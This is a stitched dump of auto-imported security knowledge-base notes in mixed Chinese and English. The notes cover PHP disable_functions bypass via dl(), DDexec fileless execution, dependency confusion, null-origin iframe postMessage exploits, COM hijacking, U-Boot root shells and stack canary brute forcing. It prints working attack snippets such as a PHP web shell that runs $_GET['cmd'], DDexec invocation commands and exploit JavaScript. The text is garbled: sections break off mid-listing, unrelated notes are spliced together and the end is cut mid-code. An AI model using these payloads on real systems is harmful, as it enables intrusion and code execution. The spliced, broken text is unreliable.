是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

This behavior can be abused in 密码 Reset, Forgot 密码，and OAuth Provider sections. # 命令 / 载荷 / 操作片段 # 1. Unicode Normalization 123456import unicodedatastring = "ᴾᵃʸˡᵒᵃᵈˢ𝓐𝓵𝓵𝕋𝕙𝕖𝒯𝒽𝒾𝓃ℊ𝓈"print ('NFC: ' + unicodedata.normalize('NFC', string))print ('NFD: ' + unicodedata.normalize('NFD', string))print ('NFKC: ' + unicodedata.normalize('NFKC', string))print ('NFKD: ' + unicodedata.normalize('NFKD', string)) # 2. Punycode 123456SELECT 'a' = 'ᵃ';+-------------+| 'a' = 'ᵃ' |+-------------+| 1 |+-------------+ # 3. Punycode 123456SELECT 'a' = 'ᵃ' COLLATE utf8mb4_0900_as_cs;+----------------------------------------+| 'a' = 'ᵃ' COLLATE utf8mb4_0900_as_cs |+----------------------------------------+| 0 |+----------------------------------------+ # 4. Base64 12345echo -n admin | base64YWRtaW4=echo -n YWRtaW4= | base64 -dadmin # 工具与参考入口 Unicode Normalization reference table NahamCon：Puny-Code: 0-Click Account Takeover PentesterLab：Unicode and NFKC Puny-Code, 0-Click Account Takeover：Voorivex：June 1, 2025 Unicode normalization vulnerabilities：Lazar：September 30, 2021 WAF Bypassing with Unicode Compatibility：Jorge Lajara：February 19, 2020 # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/防御检测与OPSEC/ERC-4337 Smart Account Security Pitfalls 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # ERC-4337 Smart Account Security Pitfalls 技术笔记 [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 ERC-4337 Smart Account Security Pitfalls 技术笔记 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 ERC-4337 Smart Account Security Pitfalls 技术笔记 建立行为证据、检测逻辑和操作暴露面。 优先关注：ERC-4337 Smart Account Security Pitfalls、Direct-call 绕过 of privileged functions、Unsigned or unchecked gas fields -> fee drain、Stateful validation clobbering (bundle semantics)、ERC-1271 replay across accounts/chains (missing domain separation)；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 4 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 ERC-4337 Smart Account Security Pitfalls Direct-call 绕过 of privileged functions Unsigned or unchecked gas fields -> fee drain Stateful validation clobbering (bundle semantics) ERC-1271 replay across accounts/chains (missing domain separation) Reverts do not refund after validation ERC-7702 initialization frontrun Quick pre-merge checks # 核心要点 Any externally callable execute (or fund-moving) function that is not restricted to EntryPoint (or a vetted executor module) can be called directly to drain the account. If signature validation only covers intent (callData) but not gas-related fields, a bundler or frontrunner can inflate fees and drain ETH. The signed 载荷 must bind at least: Defensive pattern: use the EntryPoint-provided userOpHash (which includes gas fields) and/or strictly cap each field. Because all validations run before any execution, storing validation results in contract state is unsafe. Another op in the same bundle can overwrite it, causing your execution to use attacker-influenced state. Avoid writing storage in validateUserOp. If unavoidable, key temporary data by userOpHash and delete it deterministically after use (prefer stateless validation). isValidSignature (bytes32 哈希，bytes sig) must bind signatures to this contract and this chain. Recovering over a raw 哈希 lets signatures replay across accounts or chains. Validate signatures using EntryPoint's userOpHash (binds gas fields). Restrict privileged functions to EntryPoint and/or address(this) as appropriate. # 命令 / 载荷 / 操作片段 # 1. Direct-call 绕过 of privileged functions 1234function execute(address target, uint256 value, bytes calldata data) external { (bool ok,) = target.call{value: value}(data); require(ok, "exec failed");} # 2. Direct-call 绕过 of privileged functions 1234567address public immutable entryPoint;function execute(address target, uint256 value, bytes calldata data) external { require(msg.sender == entryPoint, "not entryPoint"); (bool ok,) = target.call{value: value}(data); require(ok, "exec failed");} # 3. Unsigned or unchecked gas fields -> fee drain 1234567function validateUserOp(UserOperation calldata op, bytes32 userOpHash, uint256) external returns (uint256){ require(_isApprovedCall(userOpHash, op.signature), "bad sig"); return 0;} # 4. ERC-7702 initialization frontrun 12345function initialize(address newOwner) external { require(msg.sender == address(this), "init: only self"); require(owner == address(0), "already inited"); owner = newOwner;} # 工具与参考入口 https://blog.trailofbits.com/2026/03/11/six-mistakes-in-erc-4337-smart-accounts/ # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/防御检测与OPSEC/Disable Functions 绕过：dl Function.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Disable Functions 绕过：dl Function [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 Disable Functions 绕过：dl Function 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 Disable Functions 绕过：dl Function 建立行为证据、检测逻辑和操作暴露面。 优先关注：Why this 绕过 is uncommon today、Fast triage from a foothold、Practical 利用 constraints、You normally need write access to extension dir、The module must match the target build；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 3 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Why this 绕过 is uncommon today Fast triage from a foothold Practical 利用 constraints You normally need write access to extension dir The module must match the target build open basedir is not the main defense here Building the malicious extension Minimal workflow On the attacker box Loading and using the extension Attacker notes # 核心要点 dl () lets PHP load a shared extension at runtime. If you can make it load an attacker-controlled module, you can register a new PHP function that internally calls execve, system, or any other native primitive and therefore 绕过 disable functions. This is a real primitive, but on modern targets it is far less common than older writeups suggest. The 载荷 must be a valid PHP extension compiled for the same target ABI Also note that enable dl is an INI SYSTEM setting and, as of PHP 8.3.0, PHP documents it as deprecated, so you usually cannot flip it at runtime from attacker-controlled PHP code. If dl() is not viable, go back to the broader list of module/version dependent bypasses. PHP SAPI: if this is fpm-fcgi or apache2handler, dl () is usually a dead end for web 利用 extension dir: the 载荷 must be loaded from here A separate arbitrary 文件写入 primitive that already reaches extension dir Post - 利用 scenarios where you already escalated enough to drop files there Do not assume this works remotely just because function exists("dl") returns true in some documentation or old writeup; validate the live SAPI From PHP 8 onward, disabled functions are removed from the function table, so userland 枚举 may differ from older posts If you cannot write to extension dir, this technique is usually less practical than FPM/FastCGI, LD PRELOAD, or module-specific bypasses already covered in this section # 命令 / 载荷 / 操作片段 # 1. Fast triage from a foothold 12345678910<?phpphpinfo();echo "PHP_VERSION=" . PHP_VERSION . PHP_EOL;echo "PHP_SAPI=" . php_sapi_name() . PHP_EOL;echo "ZTS=" . (PHP_ZTS ? "yes" : "no") . PHP_EOL;echo "INT_BITS=" . (PHP_INT_SIZE * 8) . PHP_EOL;echo "enable_dl=" . ini_get("enable_dl") . PHP_EOL;echo "extension_dir=" . ini_get("extension_dir") . PHP_EOL;echo "disabled=" . ini_get("disable_functions") . PHP_EOL;?> # 2. On the attacker box 1234mkdir bypass && cd bypassphpize./configuremake # 3. Loading and using the extension 123456<?phpif (!extension_loaded('bypass')) { dl('bypass.so'); // use the correct filename for the target platform}echo bypass_exec($_GET['cmd']);?> # 工具与参考入口 PHP manual: dl Tarlogic: A deep dive into disable functions 绕过 and PHP 利用 # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

title: Dependency Confusion 技术笔记
content: 来源路径： 02-知识点/防御检测与OPSEC/Dependency Confusion 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Dependency Confusion 技术笔记 [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 Dependency Confusion 技术笔记 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 Dependency Confusion 技术笔记 建立行为证据、检测逻辑和操作暴露面。 优先关注：Dependency Confusion、工具、方法论、NPM Example、Basic Information；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 19 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Dependency Confusion 工具 方法论 NPM Example Basic Information 利用 Misspelled & Inexistent Unspecified Version / “Best-version” selection across indexes Related pattern: compromise of a legitimate package release Obfuscated Node.js droppers and manifest laundering AWS Fix Finding Vulnerable Libraries Practical Attacker Playbook (for red teams in authorized tests) Defender Playbook (what actually prevents confusion) Ecosystem Notes and Secure Config Snippets JavaScript/TypeScript (npm, Yarn, pnpm) Python (pip / Poetry) .NET (NuGet) # 核心要点 A dependency confusion attack or supply chain substitution attack occurs when a software installer script is tricked into pulling a malicious code file from a public repository instead of the intended file of the same name from an internal repository. visma-prodsec/confused：Tool to check for dependency confusion vulnerabilities in multiple package management systems DockerHub: Dockerfile image Non-existent/abandoned internal package: Importing company-logging that no longer exists internally, so the resolver looks in public registries and finds an attacker’s package. Version preference across multiple registries: Importing an internal company-requests while the resolver is allowed to also query public registries and prefers the “best”/newer version published publicly by an attacker. Key idea: If the resolver can see multiple registries for the same package name and is allowed to pick the “best” candidate globally, you’re vulnerable unless you constrain resolution. In all cases, the attacker only needs to publish a malicious package with the same name as the dependency your build resolves from a public registry. Installation-time hooks (e.g., npm scripts) or import-time code paths often give code execution. If your project references a library that isn’t available in the private registry, and your tooling falls back to a public registry, an attacker can seed a malicious package with that name in the public registry. Your runners/CI/dev machines will fetch and execute it. The attacker modifies only package.json and adds a new dependency. The hook fetches or drops the real 载荷，often choosing per-OS implants for macOS, Windows, and Linux. CI/CD runners are especially valuable targets because the hook runs before tests and often has access to cloud 凭据，package tokens, signing keys, and deployment secrets. Include minimal install-time execution where applicable (e.g., npm preinstall/install/postinstall scripts). For Python, prefer import-time execution paths, as wheels typically don’t execute arbitrary code on install. Use lockfiles that record the resolved registry URLs (npm/yarn/pnpm) or use 哈希 /attestation pinning (pip --require-hashes, Gradle dependency verification). Use explicit index selection and 哈希 pinning. Use Artifactory/Nexus/CodeArtifact/GitHub Packages/Azure Artifacts as the only endpoint developers/CI can reach. Python: commit hashed requirements.txt, enforce --require-hashes. Package provenance / attestations: when publishing public packages, enable provenance/attestations to make tampering more detectable downstream. # 命令 / 载荷 / 操作片段 # 1. Related pattern: compromise of a legitimate package release 1234567{ "name": "popular-lib", "version": "1.2.4", "dependencies": { "helper-lib": "^4.2.1" }} # 2. Related pattern: compromise of a legitimate package release 1234567{ "name": "helper-lib", "version": "4.2.1", "scripts": { "postinstall": "node setup.js" }} # 3. JavaScript/TypeScript (npm, Yarn, pnpm) 12345# Bind internal scope to private registry; do not allow public fallback for @company/*@company:registry=https://registry.corp.example/npm/# Always authenticate to the private registry//registry.corp.example/npm/:_authToken=${NPM_TOKEN}strict-ssl=true # 4. JavaScript/TypeScript (npm, Yarn, pnpm) 123456789{ "name": "@company/api-client", "version": "1.2.3", "private": false, "publishConfig": { "registry": "https://registry.corp.example/npm/", "access": "restricted" }} # 5. JavaScript/TypeScript (npm, Yarn, pnpm) 123456npmScopes: company: npmRegistryServer: "https://registry.corp.example/npm/" npmAlwaysAuth

title: DeFi AMM Accounting Bugs & Virtual Balance Cache 利用
content: 来源路径： 02-知识点/防御检测与OPSEC/DeFi AMM Accounting Bugs & Virtual Balance Cache 利用.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # DeFi AMM Accounting Bugs & Virtual Balance Cache 利用 [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 DeFi AMM Accounting Bugs & Virtual Balance Cache 利用 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 DeFi AMM Accounting Bugs & Virtual Balance Cache 利用 建立行为证据、检测逻辑和操作暴露面。 优先关注：Overview、Cache design & where it fit in the chain、利用 playbook (yETH case study)、Generalized 利用 conditions、Defensive engineering checklist；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 2 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Overview Cache design & where it fit in the chain 利用 playbook (yETH case study) Generalized 利用 conditions Defensive engineering checklist Minimal invariant fuzz targets Monitoring & response # 核心要点 Dual supply notions: internal invariant supply D and ERC-20 totalSupply could diverge during protocol-owned-liquidity reconciliation. Initialization branch trusts the cache: add liquidity() reads packed vbs[] when prev supply == 0, assuming the cache is also zeroed. Flash-loan financed state poisoning: the full chain could be executed without long-lived capital. The vulnerable flow is simplified below: Break the solver first – Feed extremely imbalanced add liquidity() inputs so the weighted-stableswap solver enters a divergent regime. vb prod becomes tiny, the Newton step truncates, Pi collapses to 0, and the attacker receives excess LP. Repair Pi, keep inflated D – Call remove liquidity(0) to recompute Pi from balances, then trigger rate/supply reconciliation so the protocol burns staking/POL yETH instead of the attacker's oversized position. Partial updates truncate results (floor division, fixed-point rounding), letting an attacker accumulate stateful residues via symmetric deposit/withdraw cycles. Public cache refresh / reconciliation paths exist (update rates, zero-amount remove/join flows, cache refresh helpers) and can be called after attacker-controlled poisoning. Recompute on initialization branches – When prev supply == 0, ignore caches entirely and rebuild virtual balances from actual 令牌 balances + live oracle rates. Prove zero-supply states are unreachable in production – If the design keeps separate notions of supply (D, ERC-20 shares, POL balances), formally test that an attacker cannot force prev supply == 0 while economically meaningful state remains. Rounding-residue drains – Aggregate per - 令牌 dust into a sink (treasury/burn) so repeated proportional adjustments do not drift caches away from real balances. Multi-transaction 检测 – Track sequences of near-symmetric deposit/withdraw events that leave the pool with low balances but high cached state, followed by supply == 0. Single-transaction anomaly detectors miss these poisoning campaigns. Alert on cache refresh after attacker-controlled state changes – Public functions that refresh rates, reconcile supply, or perform zero-amount syncs are high-signal when they appear between imbalance creation and dust deposits. # 命令 / 载荷 / 操作片段 # 1. Defensive engineering checklist 123if (totalSupply == 0) { for (uint256 i; i < tokens.length; ++i) packed_vbs[i] = 0; } # 2. Minimal invariant fuzz targets 1234567function invariant_zero_supply_clears_derived_state() public { if (pool.totalSupply() == 0) { assertEq(h.cachedVirtualBalanceSum(), 0); assertEq(h.recomputedVirtualBalanceSum(), 0); } if (h.recomputedVirtualBalanceSum() > 0) assertGt(h.cachedPi(), 0);} # 工具与参考入口 Yearn Security Disclosure：Incident disclosure 2025-12-01 Check Point Research – The $9M yETH 利用: How 16 Wei Became Infinite Tokens # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/防御检测与OPSEC/DDexec - EverythingExec 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # DDexec - EverythingExec 技术笔记 [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 DDexec - EverythingExec 技术笔记 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 DDexec - EverythingExec 技术笔记 建立行为证据、检测逻辑和操作暴露面。 优先关注：DDexec / EverythingExec、Context、Dependencies、The technique、In more detail；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 4 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 DDexec / EverythingExec Context Dependencies The technique In more detail EverythingExec # 核心要点 But this technique is here to change all of this. If you can not start the process you want... then you hijack one already existing. This technique allows you to 绕过 common protection techniques such as read-only, noexec, file-name whitelisting, 哈希 whitelisting... The final script depends on the following 工具 to work, they need to be accessible in the system you are attacking (by default you will find all of them everywhere): If we try to read or write to an address not mapped in the address space of the program we will get an I/O error. Most shell interpreters allow the creation of file descriptors that will then be inherited by child processes. We can create a fd pointing to the mem file of the sell with write permissions... so child processes that use that fd will be able to modify the shell's memory. ASLR isn't even a problem, we can check the shell's maps file or any other from the procfs in order to gain information about the address space of the process. So we need to lseek() over the file. From the shell this cannot be done unless using the infamous dd. Parse the binary we want to run and the loader to find out what mappings they need. Then craft a "shell"code that will perform, broadly speaking, the same steps that the kernel does upon each call to execve(): Read the binaries into them. Overwrite that place, which will be executable, with our shellcode (through mem we can modify unwritable pages). Pass the program we want to run to the stdin of the process (will be read() by said "shell"code). # 命令 / 载荷 / 操作片段 # 1. Dependencies 1234567891011ddbash | zsh | ash (busybox)headtailcutgrepodreadlinkwctrbase64 # 2. EverythingExec 1234tailhexdumpcmpxxd # 3. EverythingExec 1SEEKER=cmp bash ddexec.sh ls -l <<< $(base64 -w0 /bin/ls) # 4. EverythingExec 1SEEKER=xxd SEEKER_ARGS='-s $offset' zsh ddexec.sh ls -l <<< $(base64 -w0 /bin/ls) # 工具与参考入口 https://github.com/arget13/DDexec # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

The objective is not to undermine security but to streamline the testing process. Here's a comprehensive list of strategies: For captchas that require reading characters from an image, manually or programmatically determine the total number of unique images. If the set is limited, you might identify each image by its MD5 哈希. Utilize Optical Character Recognition (OCR) 工具 like Tesseract OCR to automate character reading from images. Rate Limit Testing: Check if the application limits the number of attempts or submissions in a given timeframe and whether this limit can be bypassed or reset. Session and IP Rotation: Frequently change session IDs and IP addresses to avoid 检测 and blocking by the server. https://www.capsolver.com/?utm campaign=scraping&utm content=captchabypass&utm medium=ads&utm source=google&utm term=hacktricks # 工具与参考入口 Tesseract OCR CapSolver documentation Chrome Firefox # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Using procmon it's easy to find searched COM registries that don't exist yet and could be created by an attacker. Classic filters: Also look for missing LocalServer32 keys. Some COM classes are out-of-process servers and will launch an attacker-controlled EXE instead of a DLL. Search for TreatAs and ScriptletURL registry operations in addition to InprocServer32. Recent 检测 content and malware writeups keep calling these out because they are much rarer than normal COM registrations and therefore high-signal. Copy the legitimate ThreadingModel from the original HKLM\Software\Classes\CLSID{CLSID}\InprocServer32 when cloning a registration into HKCU. Using the wrong model often breaks activation and makes the hijack noisy. Once you have decided which non-existent COM to impersonate, execute the following commands. Be careful if you decide to impersonate a COM that is loaded every few seconds as that could be overkill. Windows Tasks use Custom Triggers to call COM objects and because they're executed through the Task Scheduler, it's easier to predict when they're gonna be triggered. the target application already instantiates a stable CLSID at logon or on app start you want to execute a local or remote .sct scriptlet through the ScriptletURL value scrobj.dll reads the ScriptletURL value and executes the referenced .sct, so you can keep the 载荷 as a local file or pull it remotely over HTTP/HTTPS. # 命令 / 载荷 / 操作片段 # 1. content: 来源路径： 02-知识点/防御检测与OPSEC/Bypassing SOP with Iframes：2 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Bypassing SOP with Iframes：2 技术笔记 [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 Bypassing SOP with Iframes：2 技术笔记 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 Bypassing SOP with Iframes：2 技术笔记 建立行为证据、检测逻辑和操作暴露面。 优先关注：Bypassing SOP with Iframes：2、Iframes in SOP-2、2025 Null-Origin Popups (TryHackMe：Vulnerable Codes)、Source-nullification & frame-restriction bypasses；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 5 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Bypassing SOP with Iframes：2 Iframes in SOP-2 2025 Null-Origin Popups (TryHackMe：Vulnerable Codes) Source-nullification & frame-restriction bypasses # 核心要点 In this challenge the attacker needs to 绕过 this: The way to 绕过 the first check is by making window.calc.contentWindow to undefined and e.source to null: window.calc.contentWindow is actually document.getElementById("calc"). You can clobber document.getElementById with <img name=getElementById /> (note that Sanitizer API -here- is not configured to protect against DOM clobbering attacks in its default state). In order to 绕过 the second check about 令牌 is by sending 令牌 with value null and making window. 令牌 value undefined: Sending 令牌 in the postMessage with value null is trivial. window. 令牌 in calling the function getCookie which uses document.cookie. Note that any access to document.cookie in null origin pages tigger an error. This will make window. 令牌 have undefined value. Handlers that compare origin with window.origin inside the popup can be bypassed because both evaluate to "null", so forged messages look legitimate. Sandboxed iframes that grant allow-popups but omit allow-same-origin still spawn popups locked to the attacker-controlled null origin, giving you a stable enclave even in 2025 Chromium builds. # 命令 / 载荷 / 操作片段 # 1. Iframes in SOP-2 1if (e.source == window.calc.contentWindow && e.data.token == window.token) { # 2. Iframes in SOP-2 123456let iframe = document.createElement("iframe")document.body.appendChild(iframe)window.target = window.open("http://localhost:8080/")await new Promise((r) => setTimeout(r, 2000)) // wait for page to loadiframe.contentWindow.eval(`window.parent.target.postMessage("A", "*")`)document.body.removeChild(iframe) //e.origin === null # 3. Iframes in SOP-2 12345<html> <body> </body></html> # 4. 2025 Null-Origin Popups (TryHackMe：Vulnerable Codes) 12345678const frame = document.createElement('iframe');frame.sandbox = 'allow-scripts allow-popups';frame.srcdoc = ` <script> const pop = open('https://oauth.example/callback'); pop.postMessage({ cmd: 'getLoginCode' }, '*'); ＜\/script>`;document.body.appendChild(frame); # 5. Source-nullification & frame-restriction bypasses 12345678910const probe = document.createElement('iframe');probe.sandbox = 'allow-scripts';probe.onload = () => { const victim = open('https://target-app/'); setTimeout(() => { probe.contentWindow.postMessage(payload, '*'); probe.remove(); }, 500);};document.body.appendChild(probe); # 工具与参考入口 solution challenge **@Strellic\ ** here @terjanq following PostMessage Vulnerabilities: When Cross-Window Communication Goes Wrong THM Write-up: Vulnerable Codes # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/防御检测与OPSEC/Bypassing SOP with Iframes：1 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Bypassing SOP with Iframes：1 技术笔记 [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 Bypassing SOP with Iframes：1 技术笔记 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 Bypassing SOP with Iframes：1 技术笔记 建立行为证据、检测逻辑和操作暴露面。 优先关注：Bypassing SOP with Iframes：1、Iframes in SOP-1、SOP 绕过 1 (e.origin === null)、SOP 绕过 2 (window.origin === null)、Challenge Solution；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 2 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Bypassing SOP with Iframes：1 Iframes in SOP-1 SOP 绕过 1 (e.origin === null) SOP 绕过 2 (window.origin === null) Challenge Solution # 核心要点 In this challenge created by NDevTK and Terjanq you need you need to 利用 a XSS in the coded The main problem is that the main page uses DomPurify to send the data.body, so in order to send your own html data to that code you need to 绕过 e.origin !== window.origin. If the page was embeddable you could 绕过 that protection that way (cookies might also need to be set to SameSite=None). Therefore, for this challenge, one could create an iframe, open a popup to the page with the vulnerable XSS code handler (/iframe.php), as window.origin === e.origin because both are null it's possible to send a 载荷 that will 利用 the XSS. # 命令 / 载荷 / 操作片段 # 1. Iframes in SOP-1 12345678const identifier = "4a600cd2d4f9aa1cfb5aa786"onmessage = (e) => { const data = e.data if (e.origin !== window.origin && data.identifier !== identifier) return if (data.type === "render") { renderContainer.innerHTML = data.body }} # 2. Modify boot arguments to get a root shell Append init=/bin/sh so the kernel drops to a shell instead of normal init: If env storage isn’t write-protected, you can persist control: Check for variables like bootcount, bootlimit, altbootcmd, boot targets that influence fallback paths. Misconfigured values can grant repeated breaks into the shell. Absence of CONFIG FIT SIGNATURE/CONFIG (SPL) FIT SIGNATURE or legacy verify=n behavior often allows booting arbitrary 载荷. Also validate if PXE filename fields are passed to shell/loader logic without sanitization when chained to OS-side provisioning scripts. NXP i.MX (Serial 下载 Mode) Example: sunxi-fel -v uboot u-boot-sunxi-with-spl.bin or sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000. Example: rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin to stage a loader and 上传 a custom U-Boot. Try booting with downgraded or known-vulnerable signed boot components if Secure Boot revocations (dbx) aren’t current. If the platform still trusts old shims/bootmanagers, you can often load your own kernel or grub.cfg from the ESP to gain 持久化. # 命令 / 载荷 / 操作片段 # 1. content: 来源路径： 02-知识点/防御检测与OPSEC/BF Forked & Threaded Stack Canaries 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # BF Forked & Threaded Stack Canaries 技术笔记 [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 BF Forked & Threaded Stack Canaries 技术笔记 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 BF Forked & Threaded Stack Canaries 技术笔记 建立行为证据、检测逻辑和操作暴露面。 优先关注：BF Forked & Threaded Stack Canaries、Brute force Canary、Example 1、Example 2、Threads；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 1 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 BF Forked & Threaded Stack Canaries Brute force Canary Example 1 Example 2 Threads Other examples & references # 核心要点 If you are facing a binary protected by a canary and PIE (Position Independent Executable) you probably need to find a way to 绕过 them. The best way to 绕过 a simple canary is if the binary is a program forking child processes every time you establish a new connection with it (network service), because every time you connect to it the same canary will be used. Also note that for this example the program expected first a byte to indicate the size of the input and the 载荷. Threads of the same process will also share the same canary 令牌，therefore it'll be possible to brute-force a canary if the binary spawns a new thread every time an attack happens. As a result, the mitigation is useless because the check is used with two canaries that are the same (although modified).\ This attack is performed in the writeup: http://7rocky.github.io/en/ctf/htb-challenges/Pwn 二进制利用 /robot-factory/#canaries-and-threads 64 bits, no PIE, nx, BF canary, write in some memory a ROP 返回导向编程 to call execve and jump there. # 命令 / 载荷 / 操作片段 # 1. Example 2 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *# Here is the function to brute force the canarydef breakCanary(): known_canary = b"" test_canary = 0x0 len_bytes_to_read = 0x21 for j in range(0, 4): # Iterate up to 0xff times to brute force all posible values for byte for test_canary in range(0xff): print(f"\rTrying canary: {known_canary} 